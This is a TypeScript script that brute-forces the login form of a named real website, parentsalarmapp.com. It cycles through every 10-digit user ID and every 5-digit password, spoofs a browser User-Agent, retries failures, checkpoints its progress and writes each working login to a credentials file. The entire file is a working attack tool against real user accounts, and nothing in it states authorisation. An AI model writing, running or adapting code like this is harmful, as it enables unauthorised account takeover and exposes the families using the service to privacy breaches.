import axios, { AxiosInstance, AxiosResponse } from "axios";
import * as cheerio from "cheerio";
import * as fs from "fs";
import * as path from "path";

// Configuration
const BASE_URL = "https://parentsalarmapp.com";
const LOGIN_URL = `${BASE_URL}/`;
const USER_FIELD = "LoginId";
const PASS_FIELD = "LoginPassword";
const SUBMIT_FIELD = "command";
const SUBMIT_VALUE = "SIGN IN";

const TIMEOUT = 15000; // 15 seconds
const REQUEST_DELAY = 200; // 0.2 seconds
const MAX_RETRIES = 3;

// ID and Password ranges
const ID_START = 1000000000;
const ID_END = 9999999999; // All 10-digit IDs
const PASS_START = 11111;
const PASS_END = 99999; // All 5-digit passwords

// File paths
const BASE_DIR = path.dirname(__dirname); // Go up one level from src/ to nodejs/ root
// Save to the project root (where package.json is usually located)
const CHECKPOINT_FILE = path.join(process.cwd(), "checkpoint.json");
const CREDENTIALS_FILE = path.join(process.cwd(), "valid_credentials.txt");

interface CredentialPair {
  userId: string;
  password: string;
}

interface CheckpointData {
  currentUserId: number;
  currentPassword: number;
  totalTested: number;
  foundCredentials: CredentialPair[];
  lastUpdated: string;
}

class CredentialTester {
  private axiosInstance: AxiosInstance;
  private foundCredentials: CredentialPair[] = [];
  private totalTested = 0;

  // State management
  private currentUserId = ID_START;
  private currentPassword = PASS_START;
  private isRunning = true;

  constructor() {
    this.axiosInstance = axios.create({
      timeout: TIMEOUT,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      },
      maxRedirects: 5,
      validateStatus: () => true, // Accept all status codes
    });
  }

  public loadCheckpoint(): void {
    if (fs.existsSync(CHECKPOINT_FILE)) {
      try {
        const dataRaw = fs.readFileSync(CHECKPOINT_FILE, "utf-8");
        const data: CheckpointData = JSON.parse(dataRaw);
        this.currentUserId = data.currentUserId ?? ID_START;
        this.currentPassword = data.currentPassword ?? PASS_START;
        this.totalTested = data.totalTested ?? 0;
        this.foundCredentials = data.foundCredentials ?? [];

        console.log(
          `RESUMING from User ID: ${this.currentUserId}, Password: ${this.currentPassword}`
        );
      } catch (error: any) {
        console.error(`Error loading checkpoint: ${error.message}`);
      }
    }
  }

  public saveCheckpoint(): void {
    const data: CheckpointData = {
      currentUserId: this.currentUserId,
      currentPassword: this.currentPassword,
      totalTested: this.totalTested,
      foundCredentials: this.foundCredentials,
      lastUpdated: new Date().toISOString(),
    };
    try {
      fs.writeFileSync(CHECKPOINT_FILE, JSON.stringify(data, null, 4));
    } catch (error: any) {
      console.error(`Error saving checkpoint: ${error.message}`);
    }
  }

  private logSuccess(userId: string, password: string): void {
    const timestamp = new Date().toISOString().replace("T", " ").split(".")[0];
    const entry = `[${timestamp}] User: ${userId} | Pass: ${password}\n`;

    console.log(`\n🎉 SUCCESS FOUND: ${userId}:${password}`);
    this.foundCredentials.push({ userId, password });

    try {
      fs.appendFileSync(CREDENTIALS_FILE, entry);
    } catch (error: any) {
      console.error(`Error writing to credentials file: ${error.message}`);
    }
  }

  private async sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  // Attempt login with a fresh instance to avoid cookie pollution
  private async attemptLogin(
    userId: string,
    password: string
  ): Promise<boolean> {
    // Create a fresh instance for each attempt (or at least clear cookies if possible, but fresh instance is safer for axios)
    const freshInstance = axios.create({
      timeout: TIMEOUT,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
      },
      maxRedirects: 5,
      validateStatus: () => true,
    });

    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
      try {
        // Get login page to refresh session/CSRF
        await freshInstance.get(LOGIN_URL);

        // Prepare payload
        const payload = new URLSearchParams({
          [USER_FIELD]: userId,
          [PASS_FIELD]: password,
          [SUBMIT_FIELD]: SUBMIT_VALUE,
        });

        // Send login request
        const response: AxiosResponse = await freshInstance.post(
          LOGIN_URL,
          payload,
          {
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
          }
        );

        // Check for successful login by looking at the final URL or content
        const resUrl =
          response.request?.res?.responseUrl || response.config?.url || "";
        if (resUrl.includes("mobiledashboard")) {
          return true;
        }

        if (response.data && typeof response.data === "string") {
          if (
            response.data.includes("mobiledashboard") ||
            response.data.includes("dashboard") ||
            (response.status === 200 && !response.data.includes("login"))
          ) {
            return true;
          }
        }

        return false;
      } catch (error: any) {
        if (attempt < MAX_RETRIES - 1) {
          await this.sleep(REQUEST_DELAY * 2);
        } else {
          return false;
        }
      }
    }
    return false;
  }

  private formatNumber(num: number): string {
    return num.toLocaleString();
  }

  public stop(): void {
    console.log("\n\nStopping... Saving progress...");
    this.isRunning = false;
    this.saveCheckpoint();
    process.exit(0);
  }

  public async run(): Promise<void> {
    console.log("\n" + "=".repeat(60));
    console.log(
      "Starting comprehensive ID and password test (Node.js/TypeScript)"
    );
    console.log(`Optimized for Windows & Mac`);
    console.log(`Saving progress to: ${path.basename(CHECKPOINT_FILE)}`);
    console.log(`Saving found keys to: ${path.basename(CREDENTIALS_FILE)}`);
    console.log("=".repeat(60) + "\n");

    const totalCombinations =
      (ID_END - ID_START + 1) * (PASS_END - PASS_START + 1);

    // Main Loop
    // We start from currentUserId.
    // For the *first* user (currentUserId), we start from currentPassword.
    // For all subsequent users, we start from PASS_START.

    for (let userId = this.currentUserId; userId <= ID_END; userId++) {
      if (!this.isRunning) break;

      const userIdStr = userId.toString();
      let userFound = false;

      // Determine starting password for this user
      const startPass =
        userId === this.currentUserId ? this.currentPassword : PASS_START;

      console.log(`Testing User ID: ${userIdStr} | Start Pass: ${startPass}`);

      for (let password = startPass; password <= PASS_END; password++) {
        if (!this.isRunning) break;

        // Update state
        this.currentUserId = userId;
        this.currentPassword = password;

        const passwordStr = password.toString().padStart(5, "0");

        // Attempt login
        const success = await this.attemptLogin(userIdStr, passwordStr);
        this.totalTested++;

        if (success) {
          this.logSuccess(userIdStr, passwordStr);
          userFound = true;
          // Optional: break here if we only want one password per user
          // break;
        }

        // Feedback every 100
        if (this.totalTested % 100 === 0) {
          process.stdout.write(
            `\rTested: ${this.formatNumber(
              this.totalTested
            )} | Current: ${userIdStr}:${passwordStr}`
          );
        }

        // Checkpoint every 500
        if (this.totalTested % 500 === 0) {
          this.saveCheckpoint();
        }

        await this.sleep(REQUEST_DELAY);
      }

      this.currentPassword = PASS_START; // Reset for save safety

      if (userFound) {
        console.log(`\nFinished User ID: ${userIdStr} (Found Credentials)`);
      }

      this.saveCheckpoint();
    }

    this.printResults();
  }

  private printResults(): void {
    console.log("\n" + "=".repeat(60));
    console.log("TEST COMPLETED");
    console.log(
      `Total combinations tested: ${this.formatNumber(this.totalTested)}`
    );
    console.log("=".repeat(60));
  }
}

async function main(): Promise<void> {
  const tester = new CredentialTester();

  // Handle Ctrl+C
  process.on("SIGINT", () => {
    tester.stop();
  });

  tester.loadCheckpoint();
  await tester.run();
}

// Run the main function
if (require.main === module) {
  main().catch(console.error);
}
